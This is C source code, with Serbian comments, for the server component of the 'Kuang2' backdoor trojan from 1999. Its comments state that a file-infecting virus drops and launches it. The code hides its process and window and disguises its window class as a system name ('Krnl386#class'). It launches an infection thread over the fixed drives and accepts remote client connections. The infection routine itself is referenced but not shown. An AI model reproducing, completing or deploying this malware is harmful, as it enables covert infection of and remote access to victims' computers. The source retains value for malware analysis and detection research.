/***[ThuNderSoft]*************************************************************
								 KUANG2: server
								   ver: 0.21
								úùÄÍ WEIRD ÍÄùú
*****************************************************************************/

/* HISTORY */
// >>>>> RELEASE VERSION: 0.21 (26-may-1999) <<<<<
// ver 0.21 (26-may-1999): mali bug je ispravljen
// >>>>> RELEASE VERSION: 0.20 (22-may-1999) <<<<<
// ver 0.20 (14-may-1999): razna sre”ivanja
// ver 0.10 (30-mar-1999): born code

#include <windows.h>
#include <winsock.h>
#include <win95e.h>
#include <ctypew.h>
#include <strmem.h>
#include <tools.h>
#include "kuang2.h"

#pragma aux Wmain "_*"

extern void OnAccept(SOCKET);
extern void OnQuitclient(SOCKET);

HWND hWnd;

char Kuang2_class[MAX_COMPUTERNAME_LENGTH+2];
char temppath[MAX_PATH];
DWORD drives;
char *addfile;				// fajl za dodavanje

extern DWORD WINAPI InfectThread(LPVOID );
DWORD InfectThreadID;


/*
	MessageLoop
	-----------
  þ obrada poruka prozora. */

LRESULT CALLBACK MsgLoop(HWND hwnd, unsigned msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg) {
		// inicijalizacija programa
		case WM_CREATE:
			hWnd=hwnd;
			drives=GetDrives(DRIVE_FIXED);
			CreateThread(NULL, 0, InfectThread, NULL, 0, &InfectThreadID);
			break;

		// asinhrono obave„tavanje
		case UM_ASYNC:
			if (WSAGETSELECTEVENT(lParam)==FD_ACCEPT)
				OnAccept((SOCKET)wParam);
			break;

		// jedan od klijenata je zavr„io rad
		case UM_QUITCLIENT:
			OnQuitclient((SOCKET)wParam);
			break;

		// kraj programa
		case WM_DESTROY:
			PostQuitMessage(0);
			break;

		default:
			return (DefWindowProc(hwnd, msg, wParam, lParam));
	}
	return 0;
}


/*
	InitApp
	-------
  þ Inicijalizacija aplikacije. Registracija windows klasu za aplikaciju. */

BOOL InitApp(HINSTANCE hInst)
{
	WNDCLASSEX wc;
	HWND hwnd;

	// parametri klase
	wc.cbSize		 = sizeof(WNDCLASSEX);		// veliina strukture
	wc.style		 = 0;						// nema stilova klase
	wc.lpfnWndProc	 = (WNDPROC) MsgLoop;		// message loop procedura
	wc.cbClsExtra	 = 0;						// nema etxra data po klasi
	wc.cbWndExtra	 = 0;						// nema extra data po prozoru
	wc.hInstance	 = hInst;					// ko poseduje ovu klasu (owner)
	wc.hIcon		 = NULL;					// nema ikona (RC)
	wc.hCursor		 = NULL;					// nema kurzora (RC)
	wc.hbrBackground = NULL;					// nema default boja
	wc.lpszMenuName	 = NULL;					// nema meni (RC)
	wc.lpszClassName = Kuang2_class;			// ime za registraciju
	wc.hIconSm		 = NULL;					// nema male ikona

	// registracija klase
	if (!RegisterClassEx(&wc)) {
		if (!RegisterClass((LPWNDCLASS)&wc.style))		// mo‚da je NT u pitanju
			return FALSE;								// neupsela registracija
	}

	hwnd = CreateWindow(			// kreiramo glavni prozor aplikacije
			Kuang2_class,			// ime registrovane klase
			NULL,					// text prozora
			0,						// windows stil
			-1, -1,					// pozicija bogu iza le”a
			0, 0,					// veliina 0
			NULL,					// prethodni hwnd
			NULL,					// handle za meni ili child-prozor
			hInst,					// ova instanca poseduje (own) prozor
			NULL					// Don't need data in WM_CREATE
	);

	if (!hwnd) return FALSE;	// gre„ka?

	ShowWindow(hwnd, SW_HIDE);	// sakrij prozor
	return TRUE;				// sve je pro„lo ok.
}


/*
	WinMain
	--------
  þ Virus koji je zakaen na fajlove ekstrakuje i startuje ovog trojanca. */

int Wmain()
{
	HWND hThisInst;				// handle na program
	MSG msg;					// poruke
	char *CmdLine;				// komandna linija sa putanjom i imenom fajla
	unsigned int i;

	// inicijalizacija
	hThisInst=GetModuleHandle(NULL);

	// uzimanje komandne linije i osloba”anje od navodnika
	CmdLine=GetCommandLine();
	i=0;
	if (CmdLine[0]=='"') {                          // u najve†em broju sluajeva
		CmdLine++;									// navodnici postoje i njihovim
		while(CmdLine[i] && CmdLine[i]!='"') i++;   // skidanjem automatski se uklanjaju
		CmdLine[i]=0;								// i svi argumenti!
	}

	// to je ujedno i fajl za dodavanje!
	addfile=CmdLine;

	// formiranje jedinstvenog imena klase
	i=MAX_COMPUTERNAME_LENGTH+1;
	GetComputerName(Kuang2_class, (LPDWORD)&i);
	strcopyF(temppath, "Krnl386#class");

	if (strlengthF(Kuang2_class)>3) {
		temppath[4]=_to_lower(Kuang2_class[1]);
		temppath[5]=_to_lower(Kuang2_class[0]);
		temppath[6]=_to_lower(Kuang2_class[2]);
	}
	strcopyF(Kuang2_class, temppath);

	// ako je Kuang2 ve† aktivan iza”i
	if (FindWindow(Kuang2_class, NULL)) return 1;

	// preuzmi temp folder
	if (GetTempPath(MAX_PATH, temppath)==0)
		strcopyF(temppath, "c:\\");

	// skrivanje procesa
	HideProcess(TRUE);

	// inicijalizacija celog programa
	if (!InitApp(hThisInst)) return 3;

	// message loop
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// izlaz
	WSACleanup();
	DestroyWindow(hWnd);
	return msg.wParam;
}
